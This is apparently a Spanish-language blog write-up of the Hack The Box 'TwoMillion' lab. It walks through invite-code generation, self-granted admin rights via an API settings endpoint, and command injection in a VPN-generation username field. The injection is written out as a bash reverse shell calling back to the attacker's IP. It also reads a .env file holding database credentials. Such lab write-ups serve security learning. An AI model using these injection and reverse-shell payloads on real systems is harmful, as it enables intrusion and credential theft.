---
title: "Resolviendo la máquina TwoMillion"
date: 2026-10-12
excerpt: "Primera publicacion!!"
categories:
    - writeup
header:
    overlay_image: /assets/images/ctfs/twomillion/banner.jpeg
    overlay_filter: 0.5 
    teaser: /assets/images/ctfs/twomillion/banner.jpeg 
classes: wide
---

# Enumeración
Una vez levantada la máquina, comenzamos el proceso de enumeración de puertos. En este caso encontramos la siguiente información mediante el uso de nmap:
```shell
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.229.66
❯ nmap -sCV -p22,80 10.129.229.66 -oN targeted
```

```java
─────┬───────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ # Nmap 7.991 scan initiated Wed Oct 14 12:07:34 2026 as: nmap -sCV -p22,80 -oN targeted 10.129.229.66
   2 │ Nmap scan report for 2million.htb (10.129.229.66)
   3 │ Host is up (0.31s latency).
   4 │ 
   5 │ PORT   STATE SERVICE VERSION
   6 │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   7 │ | ssh-hostkey: 
   8 │ |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
   9 │ |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
  10 │ 80/tcp open  http    nginx
  11 │ |_http-title: Hack The Box :: Penetration Testing Labs
  12 │ | http-cookie-flags: 
  13 │ |   /: 
  14 │ |     PHPSESSID: 
  15 │ |_      httponly flag not set
  16 │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  17 │ 
  18 │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  19 │ # Nmap done at Wed Oct 14 12:07:45 2026 -- 1 IP address (1 host up) scanned in 10.87 seconds
─────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Los puertos abiertos son los siguientes: `22 -> SSH, 80 -> HTTP`.

> **IMPORTANTE** -> añadir al `/etc/hosts` la ip de la máquina!! 

# Exploración de la web
Encontramos la web antigua de HTB con su portal de acceso. Tras curiosear nos movemos hacia la pestaña de login que **requiere el hackeo del codigo de invitación**.
![Invitacion](/assets/images/ctfs/twomillion/invite_code.png)
{: .align-center}
## Código JS -> generando una invitación
Si analizamos la web mediante las dev-tools (`ctrl +i...`). Encontramos un código javascript deofuscado.
```javascript
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    }
    ;
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }
        ];
        e = function() {
            return '\\w+'
        }
        ;
        c = 1
    }
    ;while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))

```

### Funciones de interes
Encontramos al final dos funciones que tienen relación con lo que buscamos :
+ `verifyInviteCode`
+ `makeInviteCode`
Probamos en la consola de la web la función `makeInviteCode` y obtenemos un resultado encriptado! :
```
{  
"0": 200,  
"success": 1,  
"data": {  
"data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/api\\/v1\\/invite\\/generate",  
"enctype": "ROT13"  
},  
"hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."  
}
```

Utilizaré python para decodearlo, ya que buscando en google es una opcción mas rápida:
```python
python3 -c "import codecs; print(codecs.decode('Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb', 'rot_13'))"
```
`> In order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate`

Ya sabemos lo que hacer. Realizamos una petición por POST mediante curl:

```shell
> curl -X POST http://2million.htb/api/v1/invite/generate -s

{"0":200,"success":1,"data":{"code":"NExXSFMtWDdDR0YtUlFUSVgtNFhHRFA=","format":"encoded"}}
```

Para practicar un poco de bash investiguemos como podemos obtener mediante un comando la cadena entera. Buscando en google encontramos la utilidad `jq`. 
```
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "UVAxM0QtNUI1UkgtNThKSjQtRzNWVlc=",
    "format": "encoded"
  }
}
```

Y si mediante este comando le indicamos que queremos solo lo que se encuentra en .data.code extraemos la cadena que buscamos:

`> curl -X POST http://2million.htb/api/v1/invite/generate -s | jq -r '.data.code' | tr -d '='`

Pipeado con el comando `base64` ya que devuelve una cadena encodeada:
```shell
curl -X POST http://2million.htb/api/v1/invite/generate -s | jq -r '.data.code' | tr -d '=' | base64 -d 
```
![Registro](/assets/images/ctfs/twomillion/registration.png)
{: .align-center}

Creamos una cuenta y accedemos!

# API 
Nos preguntan lo siguiente:
### Task 5
> What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

Este boton es el de descarga para la VPN de HTB. Vamos hacia la url `2million.htb/home/access` y pasamos el tráfico por burpsuite. Vemos hacia que sitio va la petición GET para descarar el archivo:
```http
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vqrlkbnkg2v8mku9bo049um3rt
Connection: keep-alive
```

-> `GET /api/v1/user/vpn/generate HTTP/1.1` 

### Task 6
>How many API endpoints are there under `/api/v1/admin`?

¿Que es un API endpoint?, como buenos hackers y pentesters que somos ==buscamos en google==.:
>Un **endpoint de API** es una ***dirección digital específica (generalmente una URL) en un servidor donde una aplicación puede enviar una solicitud para obtener, crear, modificar o eliminar datos***

Entonces necesitamos enumerar cuantos de estos hay. Antes de todo vamos a hechar un vistazo dentro de /api/v1:
```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Bajo **admin** encontramos:
- `.../admin/auth` -> Por GET haceos un chequeo de si somos admin
- `.../admin/vpn` -> crea una vpn cambiando valores mediante POST
- `.../admin/setting` -> para  cambiar valores del usuario mediante PUT
Por tanto **3** enpoints.

# Elevando privilegios!
No se me ocurre una forma sí de primeras. Si realizamos una petición por GET a `/api/v1/admin/auth` obtenemos un `HTTP/1.1 401 Unauthorized`. Confirmando que no somos admin.

Después de mucho dolor de cabeza, muchas búsquedas y writeups leidos he llegado a la manera de enumerar como nuestro verifica si uno es administrador o no. Este es uno de mis primeros CTFs y la verdad que cuestan un poco estas partes!

## Probamos peticiones a recursos de la web:

### User/Auth
Realizamos una petición por get a este recurso y nos devuelve un campo interesante:
```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 14 Oct 2026 16:27:57 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53

{"loggedin":true,"username":"limonator","is_admin":0} <--- CAMPO INTERESANTE!!!
```
 Vemos que la web determina si somos administrador o no en base al campo `{"is_admin":0}` Si podemos cambiar este valor podríamos elevar de forma vertical nuestros permisos.
### Modificar valores de los usuarios
Sabemos que: 
`"/api/v1/admin/settings/update": "Update user settings"`. Por tanto si hacemos una petición por PUT a esta url debería de darnos un 200 OK:
```HTTP
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 14 Oct 2026 16:39:30 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56

{"status":"danger","message":"Missing parameter: email"} <--- Nos indica que tenemos que pasar el parámetro

``` 
Nos pide que pasemos el parámetro email, probamos a pasarle también el valor 1 en `is_admin`
```json
{
	"email":"limonator@htb.com",
	"is_admin":1
}
```
Y hemos elevado nuestro privilegio a administrador!:

``` HTTP
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 14 Oct 2026 16:42:30 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 45

{"id":13,"username":"limonator","is_admin":1}
```

# Inyección de comandos
Vamos a probar a realizar peticiones a los diferentes APIs endopoints. 

## /api/v1/admin/vpn/generate 
Si realizamos una petición con **POST** (indicando `Content-Type: application/json`) y pasando uername (pide que se pase el nombre de usuario) obtenemos algo extraño:

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 14 Oct 2026 16:52:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 10840

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1

<ca>
-----
>>aqui irian certificados raros...<<
```
Esta respuesta corresponde a la configuración en texto plano de un archivo `.ovpn`.  Probemos a injectar algún commando:

```json
{
	"username":"limonator || echo 'hola'"
}
```
Devuelve : `hola.vpn`. Entonces si pipeamos un comando se ejecuta pero pone la extensión .opvpn al final.

## Injección de comandos
He tenido que buscar esta parte porque poco controlo de este tipo de inyecciones. Pero resulta que al pasarle el username y posteriormente un $(<comando en cuestion<) se puede inyectar un comando y lanzarnos una reverse shell:
```bash
"limonator$(bash -c '/bin/bash -i >& /dev/tcp/10.10.17.49/4444 0>&1')"
```
 Obteniendo así una reverse shell. 

## Primera flag!!
Tras conseguir la shell, debemos leer la flag. Esta está ubicada en `/home/admin/user.txt`. No tenemos permisos de lectura. Pero en el archivo de variables PHP de entorno encontramos que si lo leemos:
```bash
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
Encontramos la contraseña de admin. Y así podemos leer la flag.

# Escalada de privilegios
Esta escalada de privilegios corresponde al . [**CVE-2023–0386**](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#how-the-cve-2023-0386-vulnerability-works) Quiero investigar y realizar un artículo entendiendo y explicando esta vulnerabilidad. Por ahora como buen script kiddie que soy (por el momento...) 

Después de un rato intentando hacer que el script funcionase, que compilasen los archivos .c me di cuenta que no estaba como admin. Una vez como admin nos traemos a la máquina desde local el repositorio y ejecutamos los programas tal como nos explica el repositorio de github del CVE.

Finalmente, despues de toda la tarde, conseguimos la shell como root:
![Maquina Rooteada](/assets/images/ctfs/twomillion/rooted.png)
{: .align-center}

